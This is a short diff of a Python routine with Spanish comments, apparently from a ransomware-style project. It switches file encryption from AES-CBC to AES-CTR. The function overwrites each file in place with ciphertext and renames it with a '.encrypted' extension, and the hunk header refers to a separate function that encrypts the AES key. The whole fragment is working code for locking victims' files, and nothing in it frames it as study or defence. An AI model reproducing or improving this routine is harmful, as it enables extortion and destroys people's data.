@@ -25,16 +25,16 @@ def encrypt_aes_key(aes_key):
 
 def encrypt_file(file, aes_key):
     try:
-        iv = os.urandom(16)  # Vector de inicialización
-        cipher = AES.new(aes_key, AES.MODE_CBC, iv)
+        nonce = os.urandom(8) 
+        cipher = AES.new(aes_key, AES.MODE_CTR, nonce=nonce)
         with open(file, "rb") as f:
-            datos = f.read()
-        datos_cifrados = cipher.encrypt(pad(datos, AES.block_size))
+            data = f.read()
+        encrypted_data = cipher.encrypt(data)
         with open(file, "wb") as f:
-            f.write(iv + datos_cifrados)  
+            f.write(nonce + encrypted_data)  # Guardar nonce junto con los datos cifrados
         encrypted_file = file + ".encrypted"
         os.rename(file, encrypted_file)  # Renombrar el archivo con extensión personalizada
-        print(f"Archivo cifrado: {file}->{encrypted_file}")
+        print(f"Archivo cifrado: {file} -> {encrypted_file}")
     except Exception as e:
         print(f"Error cifrando {file}: {e}")
 
